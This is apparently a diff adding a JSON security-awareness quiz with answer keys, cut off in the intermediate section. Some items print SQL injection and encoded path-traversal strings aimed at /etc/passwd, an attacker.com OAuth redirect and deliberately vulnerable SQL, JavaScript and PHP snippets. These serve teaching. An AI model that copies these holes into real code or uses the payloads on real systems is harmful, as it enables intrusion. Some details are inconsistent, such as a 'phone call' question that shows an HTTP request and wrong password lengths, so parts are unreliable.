@@ -1,0 +1,1700 @@
+{
+  "questions": {
+    "beginner": [
+      {
+        "id": "b1",
+        "type": "scenario",
+        "question": "You receive this email. What should you do?",
+        "scenario": {
+          "type": "email",
+          "from": "security@amazzon-support.com",
+          "subject": "Urgent: Your Amazon Account Has Been Suspended",
+          "content": "Dear Valued Customer,\n\nWe have detected unusual activity on your Amazon account. Your account has been temporarily suspended for security reasons. Click the link below to verify your identity and restore access:\n\n[Restore Account Access Now]\n\nIf you don't verify within 24 hours, your account will be permanently deactivated.\n\nBest regards,\nAmazon Security Team",
+          "redFlags": ["misspelled domain", "urgency tactics", "threat of account loss", "generic greeting"]
+        },
+        "options": [
+          "Click the link to verify your account immediately",
+          "Forward the email to your friends to warn them",
+          "Reply asking for more information",
+          "Report as phishing and delete the email"
+        ],
+        "correctAnswer": 3,
+        "explanation": "This is a phishing email with several red flags: misspelled domain (amazzon), urgency tactics, threat of account loss, and generic greeting. Never click links in suspicious emails.",
+        "points": 10
+      },
+      {
+        "id": "b2",
+        "type": "scenario",
+        "question": "You're setting up a new password for your bank account. Which of these passwords is the most secure?",
+        "scenario": {
+          "type": "password_analysis",
+          "passwords": [
+            {"value": "Bank123", "strength": "weak", "issues": ["too short", "common pattern", "predictable"]},
+            {"value": "MyBank2024!", "strength": "medium", "issues": ["contains common words", "predictable pattern"]},
+            {"value": "Tr0ub4dour&3", "strength": "medium", "issues": ["known pattern from xkcd comic"]},
+            {"value": "j9K#mP2$vL5nQ", "strength": "strong", "issues": []}
+          ]
+        },
+        "options": [
+          "Bank123",
+          "MyBank2024!",
+          "Tr0ub4dour&3",
+          "j9K#mP2$vL5nQ"
+        ],
+        "correctAnswer": 3,
+        "explanation": "The strongest password uses random combinations of uppercase, lowercase, numbers, and special characters without following common patterns or using dictionary words.",
+        "points": 10
+      },
+      {
+        "id": "b3",
+        "type": "scenario",
+        "question": "You're using public WiFi at a coffee shop. Which setup is most secure?",
+        "scenario": {
+          "type": "network_setup",
+          "networks": [
+            {
+              "name": "CoffeeShop_Free",
+              "security": "None",
+              "vpn": false,
+              "https": false
+            },
+            {
+              "name": "CoffeeShop_Free",
+              "security": "None",
+              "vpn": true,
+              "https": true
+            },
+            {
+              "name": "CoffeeShop_Secure",
+              "security": "WPA2",
+              "vpn": false,
+              "https": true
+            },
+            {
+              "name": "CoffeeShop_Secure",
+              "security": "WPA2",
+              "vpn": true,
+              "https": true
+            }
+          ]
+        },
+        "options": [
+          "Connect to CoffeeShop_Free without VPN",
+          "Connect to CoffeeShop_Free with VPN enabled",
+          "Connect to CoffeeShop_Secure without VPN",
+          "Connect to CoffeeShop_Secure with VPN enabled"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Using a secure network (WPA2) with a VPN provides multiple layers of protection. The VPN encrypts your traffic, and HTTPS ensures secure website connections.",
+        "points": 10
+      },
+      {
+        "id": "b4",
+        "type": "scenario",
+        "question": "You receive this pop-up while browsing. What should you do?",
+        "scenario": {
+          "type": "popup",
+          "title": "⚠️ SECURITY ALERT",
+          "content": "Your computer has been infected with 3 viruses!\nCall our security team now at 1-800-XXX-XXXX to remove the viruses before they damage your system.",
+          "redFlags": ["urgency", "scare tactics", "unsolicited phone number", "pop-up alert"]
+        },
+        "options": [
+          "Call the number immediately to fix the problem",
+          "Click the pop-up's 'Clean Now' button",
+          "Close the browser and restart your computer",
+          "Close the pop-up and scan with your installed antivirus"
+        ],
+        "correctAnswer": 3,
+        "explanation": "This is a scam pop-up using scare tactics. Never call unknown numbers from pop-ups. Use your installed antivirus software for system scans.",
+        "points": 10
+      },
+      {
+        "id": "b5",
+        "type": "scenario",
+        "question": "Your friend sends you this message on social media. What should you do?",
+        "scenario": {
+          "type": "message",
+          "platform": "Social Media",
+          "sender": "Friend",
+          "content": "Hey! Check out this amazing video of you! 😲\n[Link: bit.ly/suspicious-shortened-url]",
+          "redFlags": ["unexpected content", "shortened URL", "emotional manipulation", "unusual behavior"]
+        },
+        "options": [
+          "Click the link to see the video",
+          "Share the link with other friends",
+          "Ask your friend about it in person or via phone",
+          "Like and comment on the message"
+        ],
+        "correctAnswer": 2,
+        "explanation": "This is likely a compromised account sending malicious links. Verify unexpected messages through a different communication channel before clicking any links.",
+        "points": 10
+      },
+      {
+        "id": "b6",
+        "type": "scenario",
+        "question": "You're downloading software. Which download button is legitimate?",
+        "scenario": {
+          "type": "webpage",
+          "url": "www.downloadsoft.com",
+          "elements": [
+            {"text": "DOWNLOAD NOW", "type": "ad", "position": "top"},
+            {"text": "Download", "type": "legitimate", "position": "center"},
+            {"text": "Fast Download", "type": "ad", "position": "right"},
+            {"text": "Premium Download", "type": "ad", "position": "bottom"}
+          ]
+        },
+        "options": [
+          "Green 'DOWNLOAD NOW' button at the top",
+          "Blue 'Download' button in the center",
+          "Orange 'Fast Download' button on the right",
+          "Purple 'Premium Download' button at the bottom"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The legitimate download button is usually simple and directly on the website. Multiple flashy download buttons are often advertisements or malicious links.",
+        "points": 10
+      },
+      {
+        "id": "b7",
+        "type": "scenario",
+        "question": "Your computer shows this Windows update prompt. Is it legitimate?",
+        "scenario": {
+          "type": "system_prompt",
+          "title": "Windows Update",
+          "content": "Critical security update required. Click to install important security patches.",
+          "image": "windows-update.png",
+          "redFlags": ["incorrect logo", "grammatical errors", "non-standard UI", "unusual timing"]
+        },
+        "options": [
+          "Click 'Install Now' to update immediately",
+          "Check Windows Update in System Settings first",
+          "Ignore the prompt",
+          "Enter your password to proceed"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Always verify system updates through official channels (Windows Settings > Update & Security) rather than responding to pop-ups that could be malicious.",
+        "points": 10
+      },
+      {
+        "id": "b8",
+        "type": "scenario",
+        "question": "You receive a USB drive in the mail from an unknown sender. What's the safest action?",
+        "scenario": {
+          "type": "physical_security",
+          "item": "USB Drive",
+          "context": "Unsolicited mail delivery",
+          "risks": ["malware", "data theft", "system damage", "ransomware"]
+        },
+        "options": [
+          "Plug it in to see what's on it",
+          "Give it to your IT department for inspection",
+          "Dispose of it securely",
+          "Use it on a public computer"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Unknown USB drives could contain malware. Never plug unknown devices into your computer. Dispose of unsolicited storage devices securely.",
+        "points": 10
+      },
+      {
+        "id": "b9",
+        "type": "scenario",
+        "question": "Your bank sends this SMS. How do you proceed?",
+        "scenario": {
+          "type": "sms",
+          "sender": "BankAlert",
+          "content": "ALERT: Unusual transaction detected on your account. Click here to verify: http://bank-verify.net/secure",
+          "redFlags": ["unofficial domain", "urgency", "request to click link", "generic sender"]
+        },
+        "options": [
+          "Click the link to check your account",
+          "Reply with your account details",
+          "Open your banking app or website directly",
+          "Forward the SMS to your friends"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Never click links in banking SMS messages. Always access your bank through official apps or by typing the known URL directly.",
+        "points": 10
+      },
+      {
+        "id": "b10",
+        "type": "scenario",
+        "question": "You're working remotely. Which setup is most secure?",
+        "scenario": {
+          "type": "remote_work",
+          "options": [
+            {
+              "setup": "Public WiFi, No VPN",
+              "security": "low"
+            },
+            {
+              "setup": "Home WiFi, No VPN",
+              "security": "medium"
+            },
+            {
+              "setup": "Public WiFi, Company VPN",
+              "security": "medium-high"
+            },
+            {
+              "setup": "Home WiFi, Company VPN",
+              "security": "high"
+            }
+          ]
+        },
+        "options": [
+          "Coffee shop WiFi without VPN",
+          "Home WiFi without VPN",
+          "Coffee shop WiFi with company VPN",
+          "Home WiFi with company VPN"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Using your home WiFi with a company VPN provides the most secure setup for remote work, protecting both your connection and company data.",
+        "points": 10
+      },
+      {
+        "id": "b11",
+        "type": "scenario",
+        "question": "You notice a coworker writing their password on a sticky note. What should you do?",
+        "scenario": {
+          "type": "workplace_security",
+          "context": "Office environment",
+          "risks": ["password exposure", "unauthorized access", "security policy violation"]
+        },
+        "options": [
+          "Ignore it, it's not your concern",
+          "Take a photo as evidence",
+          "Politely inform them about password security risks",
+          "Report them to management immediately"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Kindly educating colleagues about security risks is the best approach. Explain why writing passwords down is risky and suggest using a password manager instead.",
+        "points": 10
+      },
+      {
+        "id": "b12",
+        "type": "scenario",
+        "question": "Which of these is a secure way to share sensitive files with a colleague?",
+        "scenario": {
+          "type": "file_sharing",
+          "methods": [
+            {"name": "Personal email", "encryption": "none"},
+            {"name": "Company encrypted cloud", "encryption": "AES-256"},
+            {"name": "USB drive", "encryption": "none"},
+            {"name": "Public cloud link", "encryption": "none"}
+          ]
+        },
+        "options": [
+          "Send via personal email",
+          "Share through company's encrypted cloud storage",
+          "Copy to a USB drive",
+          "Upload to public cloud storage"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Company-provided encrypted cloud storage ensures data security through encryption and access controls while maintaining audit trails.",
+        "points": 10
+      },
+      {
+        "id": "b13",
+        "type": "scenario",
+        "question": "Your device shows this Windows Defender alert. What action should you take?",
+        "scenario": {
+          "type": "antivirus_alert",
+          "alert": "Threat detected: Suspicious file in downloads",
+          "file": "invoice_pdf.exe",
+          "severity": "High",
+          "actions": ["Quarantine", "Ignore", "More info"]
+        },
+        "options": [
+          "Run the file to check if it's safe",
+          "Delete the file immediately",
+          "Quarantine and scan the file",
+          "Ignore the alert, it's probably a false positive"
+        ],
+        "correctAnswer": 2,
+        "explanation": "When dealing with suspicious files, quarantine is the safest first action. It isolates the potential threat while allowing for proper investigation.",
+        "points": 10
+      },
+      {
+        "id": "b14",
+        "type": "scenario",
+        "question": "Which of these passwords would be most secure for your online banking?",
+        "scenario": {
+          "type": "password_security",
+          "passwords": [
+            {"value": "Banking123!", "length": 10, "complexity": "low"},
+            {"value": "P@ssw0rd2024", "length": 11, "complexity": "medium"},
+            {"value": "kX9#mP2$vL5nQ", "length": 12, "complexity": "high"},
+            {"value": "mybanking", "length": 9, "complexity": "very low"}
+          ]
+        },
+        "options": [
+          "Banking123!",
+          "P@ssw0rd2024",
+          "kX9#mP2$vL5nQ",
+          "mybanking"
+        ],
+        "correctAnswer": 2,
+        "explanation": "The password 'kX9#mP2$vL5nQ' is most secure as it uses random characters, mixed case, numbers, and special characters without following common patterns.",
+        "points": 10
+      },
+      {
+        "id": "b15",
+        "type": "scenario",
+        "question": "You receive a call from 'Microsoft Support' about your computer. They say it's infected and need remote access. What should you do?",
+        "scenario": {
+          "type": "phone_scam",
+          "caller": "Microsoft Support",
+          "claims": ["Computer is infected", "Need remote access", "Will fix for free"],
+          "redFlags": ["Unsolicited call", "Urgency", "Request for access"]
+        },
+        "options": [
+          "Give them access to fix the problem",
+          "Provide your credit card details for verification",
+          "Hang up and report the number",
+          "Ask them to call back later"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Microsoft never makes unsolicited support calls. This is a common scam attempting to gain unauthorized access to your computer. Hang up and report the number.",
+        "points": 10
+      },
+      {
+        "id": "b16",
+        "type": "scenario",
+        "question": "You receive a LinkedIn connection request. What's suspicious?",
+        "scenario": {
+          "type": "social_media",
+          "profile": {
+            "name": "John Smith",
+            "title": "CEO at Multiple Companies",
+            "connections": "2",
+            "joined": "2024",
+            "photo": "stock_photo.jpg"
+          }
+        },
+        "options": [
+          "The person is a CEO",
+          "The profile was created recently",
+          "They have a profile photo",
+          "All of the above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple red flags: generic name, multiple CEO positions, very few connections, newly created profile, and stock photo - typical signs of a fake profile.",
+        "points": 10
+      },
+      {
+        "id": "b17",
+        "type": "scenario",
+        "question": "Your webcam light turns on unexpectedly. What should you do?",
+        "scenario": {
+          "type": "device_security",
+          "indicators": ["Webcam light on", "No active video apps", "Normal CPU usage"],
+          "context": "Working on documents"
+        },
+        "options": [
+          "Ignore it, probably a glitch",
+          "Cover the webcam and investigate",
+          "Restart the computer immediately",
+          "Continue working normally"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Cover the webcam immediately to prevent potential spying, then investigate which application is accessing it through system settings or security software.",
+        "points": 10
+      },
+      {
+        "id": "b18",
+        "type": "scenario",
+        "question": "You find a QR code poster in a public place. What's the safest action?",
+        "scenario": {
+          "type": "qr_security",
+          "location": "Public bulletin board",
+          "content": "Scan for free WiFi access",
+          "appearance": "Slightly damaged"
+        },
+        "options": [
+          "Scan it immediately for free WiFi",
+          "Take a photo to scan later",
+          "Avoid scanning unknown QR codes",
+          "Share it with friends"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Avoid scanning QR codes from untrusted sources in public places. They could lead to malicious websites or trigger automatic downloads.",
+        "points": 10
+      },
+      {
+        "id": "b19",
+        "type": "scenario",
+        "question": "Your printer starts printing unexpectedly. What should you check first?",
+        "scenario": {
+          "type": "device_security",
+          "event": "Unexpected printing",
+          "network": "Home WiFi",
+          "printer": "WiFi-enabled"
+        },
+        "options": [
+          "Unplug the printer immediately",
+          "Check printer network settings",
+          "Print a test page",
+          "Ignore it"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Check printer network settings first. Unsecured WiFi printers can be accessed by anyone within range. Enable printer security features.",
+        "points": 10
+      },
+      {
+        "id": "b20",
+        "type": "scenario",
+        "question": "You receive a voicemail about your credit card. What's suspicious?",
+        "scenario": {
+          "type": "voice_phishing",
+          "message": "This is an urgent message about your credit card. Call back immediately at 1-800-XXX-XXXX to prevent account suspension.",
+          "caller": "Unknown",
+          "time": "11:45 PM"
+        },
+        "options": [
+          "Late night call time",
+          "Urgency in message",
+          "Unknown caller number",
+          "All of the above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple red flags: late-night timing, urgency, unknown number. Banks don't make urgent late-night calls. Always verify by calling your bank's official number.",
+        "points": 10
+      },
+      {
+        "id": "b21",
+        "type": "scenario",
+        "question": "Your smart home device starts acting strangely. What's the first step?",
+        "scenario": {
+          "type": "iot_security",
+          "device": "Smart speaker",
+          "behavior": "Activating without prompt",
+          "network": "Home WiFi"
+        },
+        "options": [
+          "Factory reset immediately",
+          "Check device settings and logs",
+          "Unplug and ignore it",
+          "Buy a new device"
+        ],
+        "correctAnswer": 1,
+        "explanation": "First check device settings and logs for unauthorized access or unusual activities. Then ensure the device firmware is up to date.",
+        "points": 10
+      },
+      {
+        "id": "b22",
+        "type": "scenario",
+        "question": "Your phone battery drains unusually fast. What should you check?",
+        "scenario": {
+          "type": "mobile_security",
+          "symptoms": ["Fast battery drain", "Phone feels warm", "Normal usage"],
+          "recent_changes": "Installed new game app"
+        },
+        "options": [
+          "Buy a new battery",
+          "Check recently installed apps",
+          "Use phone until it dies",
+          "Turn off the phone"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Unusual battery drain can indicate malicious apps running in background. Check recently installed apps and their permissions.",
+        "points": 10
+      },
+      {
+        "id": "b23",
+        "type": "scenario",
+        "question": "You're asked to share your screen in a meeting. What should you do first?",
+        "scenario": {
+          "type": "meeting_security",
+          "platform": "Video conference",
+          "request": "Screen sharing",
+          "meeting": "External client"
+        },
+        "options": [
+          "Share immediately",
+          "Close sensitive documents first",
+          "Decline sharing",
+          "End the meeting"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Before screen sharing, close or minimize sensitive documents, emails, and notifications to prevent accidental data exposure.",
+        "points": 10
+      },
+      {
+        "id": "b24",
+        "type": "scenario",
+        "question": "Your child asks to download a free game. What's the first check?",
+        "scenario": {
+          "type": "app_security",
+          "platform": "Mobile app store",
+          "app": {
+            "name": "Fun Game Pro",
+            "rating": "None",
+            "downloads": "100+",
+            "permissions": ["Camera", "Contacts", "Location"]
+          }
+        },
+        "options": [
+          "Install if it's free",
+          "Check reviews and permissions",
+          "Ask child's friends",
+          "Block all games"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Check app reviews, ratings, developer reputation, and required permissions. Be suspicious of new apps with few downloads requesting excessive permissions.",
+        "points": 10
+      },
+      {
+        "id": "b25",
+        "type": "scenario",
+        "question": "Your fitness tracker asks to share data. What should you review?",
+        "scenario": {
+          "type": "privacy_settings",
+          "device": "Fitness tracker",
+          "request": "Data sharing",
+          "data_types": ["Location", "Heart rate", "Sleep patterns"]
+        },
+        "options": [
+          "Share everything",
+          "Review privacy settings",
+          "Decline all sharing",
+          "Remove device"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Review privacy settings and data sharing options. Only share necessary data and understand how your information will be used and protected.",
+        "points": 10
+      }
+    ],
+    "intermediate": [
+      {
+        "id": "i1",
+        "type": "scenario",
+        "question": "Analyze this network traffic pattern. What type of attack is occurring?",
+        "scenario": {
+          "type": "network_analysis",
+          "traffic_pattern": "Multiple rapid SYN packets from various IPs to port 80",
+          "timestamp": "Last 5 minutes",
+          "volume": "100x normal",
+          "characteristics": ["SYN flood", "distributed sources", "no handshake completion"]
+        },
+        "options": [
+          "Malware infection",
+          "DDoS attack",
+          "Data breach",
+          "Port scanning"
+        ],
+        "correctAnswer": 1,
+        "explanation": "This pattern shows a DDoS attack using SYN flood: multiple SYN packets from different sources without completing the TCP handshake.",
+        "points": 20
+      },
+      {
+        "id": "i2",
+        "type": "scenario",
+        "question": "Review this SQL query in a login form. What vulnerability exists?",
+        "scenario": {
+          "type": "code_review",
+          "language": "SQL",
+          "code": "SELECT * FROM users WHERE username = '${username}' AND password = '${password}'",
+          "input_handling": "direct string concatenation",
+          "risks": ["SQL injection", "authentication bypass", "data exposure"]
+        },
+        "options": [
+          "Weak password policy",
+          "SQL injection vulnerability",
+          "Cross-site scripting",
+          "Buffer overflow"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Direct string concatenation in SQL queries allows SQL injection attacks. Use prepared statements or parameterized queries instead.",
+        "points": 20
+      },
+      {
+        "id": "i3",
+        "type": "scenario",
+        "question": "Examine this server configuration. What security issue exists?",
+        "scenario": {
+          "type": "config_review",
+          "service": "Web Server",
+          "config": {
+            "ssl_protocols": "SSLv3 TLSv1",
+            "cipher_suite": "HIGH:MEDIUM:!aNULL",
+            "directory_listing": "on",
+            "server_tokens": "on"
+          }
+        },
+        "options": [
+          "Missing firewall rules",
+          "Outdated SSL/TLS protocols",
+          "Weak password policy",
+          "Insufficient logging"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The configuration uses outdated SSL/TLS protocols (SSLv3, TLSv1) which have known vulnerabilities. Use TLSv1.2 or higher.",
+        "points": 20
+      },
+      {
+        "id": "i4",
+        "type": "scenario",
+        "question": "Your colleague receives this phone call. What attack is this?",
+        "scenario": {
+          "type": "web_request",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "1024",
+            "Transfer-Encoding": "chunked"
+          },
+          "body": "Multiple different content lengths"
+        },
+        "options": [
+          "XSS",
+          "HTTP request smuggling",
+          "CSRF",
+          "Path traversal"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The request shows HTTP request smuggling attempt using conflicting Content-Length and Transfer-Encoding headers.",
+        "points": 30
+      },
+      {
+        "id": "i5",
+        "type": "scenario",
+        "question": "Analyze this HTTP response header. What security header is missing?",
+        "scenario": {
+          "type": "header_analysis",
+          "headers": {
+            "Server": "nginx/1.18.0",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "strict-origin-when-cross-origin"
+          }
+        },
+        "options": [
+          "Content-Security-Policy",
+          "Cache-Control",
+          "Access-Control-Allow-Origin",
+          "Set-Cookie"
+        ],
+        "correctAnswer": 0,
+        "explanation": "Content-Security-Policy (CSP) header is missing, which helps prevent XSS and other injection attacks by controlling resource loading.",
+        "points": 20
+      },
+      {
+        "id": "i6",
+        "type": "scenario",
+        "question": "Review this access log. What suspicious activity do you notice?",
+        "scenario": {
+          "type": "log_analysis",
+          "log_entries": [
+            "10.0.0.1 - - [10/Feb/2024:02:15:00] 'GET /admin HTTP/1.1' 403",
+            "10.0.0.1 - - [10/Feb/2024:02:15:01] 'GET /admin?id=1 OR 1=1 HTTP/1.1' 403",
+            "10.0.0.1 - - [10/Feb/2024:02:15:02] 'GET /admin?id=1; DROP TABLE users HTTP/1.1' 403"
+          ]
+        },
+        "options": [
+          "Brute force attack",
+          "SQL injection attempts",
+          "DDoS attack",
+          "Path traversal"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The log shows SQL injection attempts using common patterns like 'OR 1=1' and 'DROP TABLE'.",
+        "points": 20
+      },
+      {
+        "id": "i7",
+        "type": "scenario",
+        "question": "Examine this email header. What indicates it's spoofed?",
+        "scenario": {
+          "type": "email_header",
+          "headers": {
+            "From": "ceo@company.com",
+            "Reply-To": "different@domain.com",
+            "Return-Path": "attacker@malicious.com",
+            "DKIM": "fail",
+            "SPF": "fail"
+          }
+        },
+        "options": [
+          "Large attachment size",
+          "HTML formatting",
+          "Mismatched sender information",
+          "Missing subject"
+        ],
+        "correctAnswer": 2,
+        "explanation": "The mismatched From, Reply-To, and Return-Path addresses, along with failed DKIM and SPF checks, indicate email spoofing.",
+        "points": 20
+      },
+      {
+        "id": "i8",
+        "type": "scenario",
+        "question": "Your system shows these processes. Which is suspicious?",
+        "scenario": {
+          "type": "process_list",
+          "processes": [
+            {"name": "svchost.exe", "path": "C:\\Windows\\System32", "cpu": "1%"},
+            {"name": "svch0st.exe", "path": "C:\\Windows\\Temp", "cpu": "60%"},
+            {"name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome", "cpu": "5%"},
+            {"name": "explorer.exe", "path": "C:\\Windows", "cpu": "2%"}
+          ]
+        },
+        "options": [
+          "svchost.exe in System32",
+          "svch0st.exe in Temp",
+          "chrome.exe",
+          "explorer.exe"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The svch0st.exe process is suspicious due to: misspelled name (0 instead of o), unusual location (Temp folder), and high CPU usage.",
+        "points": 20
+      },
+      {
+        "id": "i9",
+        "type": "scenario",
+        "question": "Analyze this network capture. What attack is happening?",
+        "scenario": {
+          "type": "packet_capture",
+          "protocol": "DNS",
+          "pattern": "Multiple queries for random subdomains",
+          "destination": "Single IP",
+          "volume": "High",
+          "payload": "Encoded data in queries"
+        },
+        "options": [
+          "DNS tunneling",
+          "ARP spoofing",
+          "MAC flooding",
+          "DHCP starvation"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The pattern shows DNS tunneling: using DNS queries with encoded data to exfiltrate information or bypass security controls.",
+        "points": 20
+      },
+      {
+        "id": "i10",
+        "type": "scenario",
+        "question": "Review this certificate error. What's the security risk?",
+        "scenario": {
+          "type": "ssl_cert",
+          "domain": "bank.com",
+          "issuer": "Let's Encrypt",
+          "subject": "*.different-bank.com",
+          "validity": "Valid",
+          "san": ["*.different-bank.com", "different-bank.com"]
+        },
+        "options": [
+          "Expired certificate",
+          "Weak encryption",
+          "Domain mismatch",
+          "Self-signed certificate"
+        ],
+        "correctAnswer": 2,
+        "explanation": "The certificate domain doesn't match the website's domain, indicating possible man-in-the-middle attack or phishing attempt.",
+        "points": 20
+      },
+      {
+        "id": "i11",
+        "type": "scenario",
+        "question": "Analyze this network traffic. What type of attack is occurring?",
+        "scenario": {
+          "type": "network_traffic",
+          "pattern": "Multiple failed login attempts from different IPs",
+          "frequency": "100 attempts/minute",
+          "target": "Admin login page",
+          "timing": "Automated intervals"
+        },
+        "options": [
+          "SQL Injection",
+          "Brute Force Attack",
+          "Man-in-the-Middle",
+          "Cross-Site Scripting"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The pattern of rapid, automated login attempts from multiple IPs indicates a distributed brute force attack attempting to crack admin credentials.",
+        "points": 20
+      },
+      {
+        "id": "i12",
+        "type": "scenario",
+        "question": "Review this JavaScript code. What vulnerability exists?",
+        "scenario": {
+          "type": "code_review",
+          "language": "JavaScript",
+          "code": "const userInput = document.getElementById('input').value;\ndocument.getElementById('output').innerHTML = userInput;",
+          "context": "User input display"
+        },
+        "options": [
+          "Buffer Overflow",
+          "SQL Injection",
+          "Cross-Site Scripting (XSS)",
+          "Path Traversal"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Direct assignment of user input to innerHTML without sanitization enables XSS attacks. Always sanitize user input or use textContent instead.",
+        "points": 20
+      },
+      {
+        "id": "i13",
+        "type": "scenario",
+        "question": "Examine this URL. What attack is being attempted?",
+        "scenario": {
+          "type": "url_analysis",
+          "url": "http://bank.com/transfer?amount=1000&to=attacker&__debug=true&admin=1",
+          "method": "GET",
+          "params": ["amount", "to", "__debug", "admin"]
+        },
+        "options": [
+          "Parameter Tampering",
+          "URL Encoding Attack",
+          "Directory Traversal",
+          "Cookie Manipulation"
+        ],
+        "correctAnswer": 0,
+        "explanation": "The URL shows parameter tampering attempts using debug flags and admin parameters to bypass security controls.",
+        "points": 20
+      },
+      {
+        "id": "i14",
+        "type": "scenario",
+        "question": "Your server logs show these entries. What's happening?",
+        "scenario": {
+          "type": "log_analysis",
+          "entries": [
+            "GET /admin/../../etc/passwd HTTP/1.1",
+            "GET /admin/%2e%2e/%2e%2e/etc/passwd HTTP/1.1",
+            "GET /admin/..%2f..%2fetc/passwd HTTP/1.1"
+          ]
+        },
+        "options": [
+          "SQL Injection",
+          "Path Traversal",
+          "File Inclusion",
+          "Command Injection"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The logs show path traversal attempts using different encoding methods to access sensitive system files.",
+        "points": 20
+      },
+      {
+        "id": "i15",
+        "type": "scenario",
+        "question": "Analyze this cookie. What security issue exists?",
+        "scenario": {
+          "type": "cookie_analysis",
+          "cookie": {
+            "name": "session",
+            "value": "admin:false",
+            "httpOnly": false,
+            "secure": false
+          }
+        },
+        "options": [
+          "Cookie not encrypted",
+          "Missing security flags",
+          "Cookie tampering possible",
+          "All of the above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "The cookie has multiple security issues: plaintext values, missing HttpOnly flag (XSS risk), missing Secure flag (MITM risk), and client-side modifiable values.",
+        "points": 20
+      },
+      {
+        "id": "i16",
+        "type": "scenario",
+        "question": "Analyze this API request. What vulnerability exists?",
+        "scenario": {
+          "type": "api_security",
+          "request": {
+            "method": "GET",
+            "endpoint": "/api/user/profile?id=1 OR 1=1",
+            "headers": {
+              "Authorization": "Bearer eyJhbGciOiJub25lIn0..."
+            }
+          }
+        },
+        "options": [
+          "CSRF attack",
+          "SQL injection",
+          "XSS vulnerability",
+          "Buffer overflow"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The API endpoint is vulnerable to SQL injection through the id parameter, allowing retrieval of unauthorized user profiles.",
+        "points": 20
+      },
+      {
+        "id": "i17",
+        "type": "scenario",
+        "question": "Review this server response. What security header is misconfigured?",
+        "scenario": {
+          "type": "header_security",
+          "headers": {
+            "X-Frame-Options": "ALLOW-ALL",
+            "Content-Security-Policy": "default-src 'self'",
+            "Strict-Transport-Security": "max-age=31536000"
+          }
+        },
+        "options": [
+          "CSP header",
+          "X-Frame-Options",
+          "HSTS header",
+          "None"
+        ],
+        "correctAnswer": 1,
+        "explanation": "X-Frame-Options is misconfigured with 'ALLOW-ALL' (invalid value). Should be DENY, SAMEORIGIN, or ALLOW-FROM uri.",
+        "points": 20
+      },
+      {
+        "id": "i18",
+        "type": "scenario",
+        "question": "Examine this OAuth flow. What's the security risk?",
+        "scenario": {
+          "type": "oauth_flow",
+          "redirect_uri": "https://attacker.com/callback",
+          "response_type": "token",
+          "state": null
+        },
+        "options": [
+          "Missing state parameter",
+          "Invalid scope",
+          "Expired token",
+          "Wrong grant type"
+        ],
+        "correctAnswer": 0,
+        "explanation": "Missing state parameter in OAuth flow enables CSRF attacks. State parameter should be used to prevent authorization code injection attacks.",
+        "points": 20
+      },
+      {
+        "id": "i19",
+        "type": "scenario",
+        "question": "Analyze this WebSocket connection. What's vulnerable?",
+        "scenario": {
+          "type": "websocket_security",
+          "url": "ws://api.example.com/socket",
+          "headers": {},
+          "origin": null
+        },
+        "options": [
+          "Unencrypted connection",
+          "Missing authentication",
+          "Invalid protocol",
+          "All of the above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple issues: using ws:// instead of wss://, no authentication headers, and no origin checking - enabling unauthorized access and MitM attacks.",
+        "points": 20
+      },
+      {
+        "id": "i20",
+        "type": "scenario",
+        "question": "Review this file upload code. What's the vulnerability?",
+        "scenario": {
+          "type": "code_review",
+          "language": "PHP",
+          "code": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);"
+        },
+        "options": [
+          "Path traversal",
+          "File type validation",
+          "Size limitation",
+          "All of the above"
+        ],
+        "correctAnswer": 3,
+        "explanation": "Multiple vulnerabilities: no path traversal prevention, no file type validation, no size limits. Could allow uploading of malicious files.",
+        "points": 20
+      },
+      {
+        "id": "i21",
+        "type": "scenario",
+        "question": "Examine this GraphQL query. What attack is possible?",
+        "scenario": {
+          "type": "graphql_security",
+          "query": "query { user(id: 1) { friends { friends { friends { ... } } } }"
+        },
+        "options": [
+          "SQL injection",
+          "Nested query DoS",
+          "Type confusion",
+          "Field injection"
+        ],
+        "correctAnswer": 1,
+        "explanation": "The deeply nested friends query could cause a DoS through resource exhaustion. GraphQL depth limiting should be implemented.",
+        "points": 20
+      },
+      {
+        "id": "i22",
+        "type": "scenario",
+        "question": "Review this CORS configuration. What's misconfigured?",
+        "scenario": {
+          "type": "cors_config",
+          "headers": {
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Credentials": "true"
+          }
+        },
+        "options": [
+          "Invalid origin",
+          "Credential mismatch",
+          "Missing methods",
+          "Wrong header"
+        ],
+        "correctAnswer": 1,
+        "explanation": "Allowing credentials with wildcard origin is a security risk. When using credentials, specific origins must be listed.",
+        "points": 20
+      },
+      {
+        "id": "i23",
+        "type": "scenario",
+        "question": "Analyze this session configuration. What's insecure?",
+        "scenario": {
+          "type": "session_security",
+          "config": {
+            "cookie": {
+              "secure": false,
